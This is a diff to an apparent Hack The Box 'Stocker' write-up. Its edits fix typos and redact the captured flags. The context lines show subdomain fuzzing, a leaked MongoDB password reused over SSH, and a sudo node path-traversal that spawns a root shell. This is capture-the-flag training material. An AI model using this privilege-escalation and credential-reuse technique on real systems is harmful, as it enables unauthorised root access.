@@ -45,7 +45,7 @@ $ grep stocker /etc/hosts
 ```
 ### Fuzzing (1)
 
-> _It's a **static website** (`/index.html`) which indicates that won't have any interesting sub-directory, but may have vhosts/sub-domains._
+> _It's a **static website** (`/index.html`) which indicates that won't have any interesting sub-directories, but may have vhosts/sub-domains._
 
 ```bash
 # sub-directory fuzzing
@@ -121,7 +121,7 @@ $ ffuf -u http://dev.stocker.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery
     * FUZZ:
 ```
 
-Intercepting the a failed `/login` attempt:
+Intercepting a failed `/login` attempt:
 
 ![](login_request.png)
 
@@ -144,7 +144,7 @@ ETag: W/"a6b-184e6db4279"
 Set-Cookie: connect.sid=s%3A7De-SJd6Go3r1cgA0BD09V6L89EmsJJW.TLRIKijtdnUMJOOfRhIDSFQdo%2FfepNFD2u%2BzwJSDwks; Path=/; HttpOnly
 ```
 
->_Node.js commonly uses MongoDB ([MEAN stack](https://www.mongodb.com/mean-stack)).
+>_Node.js commonly uses MongoDB ([MEAN stack](https://www.mongodb.com/mean-stack))_.
 
 ![](https://webimages.mongodb.com/_com_assets/cms/mean-stack-0qy07j83ah.png?auto=format%2Ccompress)
 
@@ -166,25 +166,26 @@ Add an item to cart and intercept `Submit Purchase` request:
 
 ![](htmli.png)
 
-![](pdf_passwd.png)
+![](pdf_passwd.png){: .normal width="65%"}
 
 ![](burp_jsconfig.png)
 
 ![](jsconfig.png)
 
-```node.js
+```java
 // TODO: Configure loading from dotenv for production
 const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
 ```
 
->_The only user was `angoose`, there was no `dev` user within `/etc/passwd`.
+>_The only user was `angoose`, there was no `dev` user within `/etc/passwd`._
 
 ```bash
 $ ssh angoose@10.10.11.196
 ...snip...
 angoose@stocker:~$ cat user.txt
-6fbadb90b1d4707f61b40e8ff054a405
+...snip...
 ```
+
 ## Privilege Escalation
 
 ```bash
@@ -210,10 +211,12 @@ require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})
 angoose@stocker:/tmp$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/root.js
 [sudo] password for angoose:
 # cat /root/root.txt
-03120fb9d5d6a99ef6ebac022d6f62de
+...snip...
 ```
 
->_In `Sudo 1.9.10+` regex can be used in the sudoers file, which can replace `*` and avoid directory traversal attacks!
+>_In `Sudo 1.9.10+` regex can be used in the sudoers file, which can replace `*` and avoid directory traversal attacks!_
+
+![](machine_pwned.png){: width="75%" .normal}
 
 ## Extra
 
@@ -267,5 +270,3 @@ $ echo -n '{"_id":{"$oid":"638f116eeb060210cbd83a8a"},"username":"angoose","pass
   }
 }
 ```
-
-![](machine_pwned.png){: width="75%" .normal}
